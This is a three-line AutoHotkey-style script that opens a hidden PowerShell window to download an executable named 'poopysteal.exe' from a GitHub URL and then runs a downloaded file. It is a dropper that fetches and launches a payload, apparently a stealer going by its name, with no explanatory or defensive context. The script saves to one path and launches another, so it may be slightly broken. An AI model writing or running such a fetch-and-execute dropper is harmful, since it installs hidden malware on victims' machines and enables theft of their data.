Run, powershell -WindowStyle Hidden Invoke-RestMethod 'https://raw.githubusercontent.com/TripsGitHub/poop/refs/heads/main/poopysteal.exe' -OutFile .\poop.exe
Sleep, 3000
Run, powershell Invoke-Item .\Downloads\poop.exe
